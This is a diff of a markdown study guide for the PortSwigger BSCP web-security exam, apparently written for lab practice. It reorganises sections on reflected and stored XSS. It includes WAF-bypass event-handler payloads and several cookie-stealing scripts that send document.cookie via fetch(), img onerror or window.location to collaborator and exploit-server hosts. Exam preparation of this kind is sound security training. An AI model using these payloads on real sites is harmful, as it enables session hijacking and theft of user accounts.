@@ -18,12 +18,30 @@ Maybe we can use the acronym BSCP, like OSCP  :)
 
 + [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 + [PayloadsAllTheThings (XSS)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-htmlapplications)  
+  
+### Methodology to identify allowed XSS Tags  
 
-### Cookie Stealers
+>Identified Reflected XSS in **search** function then determine the HTML tags and events attributes not blocked  
 
-### Reflected XSS in Search with WAF  
+<sup>Body and event **'onresize'** is only allowed</sup>  
 
->Search with Reflected XSS deliver Phishing link to victim with cookie stealing payload  
+```JavaScript
+?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+```
+<sup>Body and event **'onpopstate'** is only allowed</sup>  
+
+```JavaScript
+?search=%22%3E%3Cbody%20onpopstate=print()>
+```
+[Example: onpopstate event (XSS)](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpopstate)  
+
+>The below lab gives great Methodology to identify allowed HTML tags and events for crafting POC XSS.  
+
+[PortSwigger Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)  
+  
+### Cookie Stealers (Reflected)  
+
+>Search with Reflected XSS deliver Phishing link to victim with cookie stealing payload.  
 
 <sub>WAF is preventing dangerous search filters and tags!</sub>  
 
@@ -47,7 +65,6 @@ ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20v
   + setImmediate("code")
   + Function("code")()
   
-
 ![Burp collaborator receiving request with base64 cookie value from our POC.](xss2.png)  
 
 >Hosting the **IFRAME** with eval() and fetch() payload on web exploit server, respectively base64 encoded and URL encoded.  
@@ -69,34 +86,14 @@ https://TARGET.web-security-academy.net/?SearchTerm="+eval(atob("ZmV0Y2goImh0dHB
 https://TARGET.web-security-academy.net/?SearchTerm="+eval(atob("fetch("https://839cktu7uogedm6a1kjuy3outlzcn2br.oastify.com/?c=" + btoa(document['cookie']))"))}//  
 ```  
   
-### Reflected XSS in Search with blocked Tags  
-
->Reflected XSS into HTML context with most tags and attributes blocked Bypass WAF  
-
-<sup>Body and event **'onresize'** is only allowed</sup>  
-
-```JavaScript
-?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
-```
-<sup>Body and event **'onpopstate'** is only allowed</sup>  
-
-```JavaScript
-?search=%22%3E%3Cbody%20onpopstate=print()>
-```
-[Example: onpopstate event (XSS)](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpopstate)  
-
->The below lab gives great Methodology to identify allowed HTML tags and events for crafting POC XSS.  
-
-[PortSwigger Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)  
-
-#### URL and Base64 online encoders and decoders  
+#### URL & Base64 encoders and decoders  
 
 [URL Decode and Encode](https://www.urldecoder.org/)  
 [BASE64 Decode and Encode](https://www.base64encode.org/)    
   
 ### Stored XSS
 
->Blog post comment section  
+>Cross site Scriting found in Blog post comment. Cookie Stealer send victim to exploit server logs.  
 
 ```html
 <img src="1" onerror="window.location='http://exploit.net/cookie='+document.cookie">
@@ -116,7 +113,7 @@ document.write('<img src="http://exploit.net?cookieStealer='+document.cookie+'" 
 </script>
 ```  
 
->Fetch API Cookie Stealer in blog comment.  
+>**Fetch API** JavaScript Cookie Stealer payload in blog post comment.  
 
 ```JavaScript
 <script>
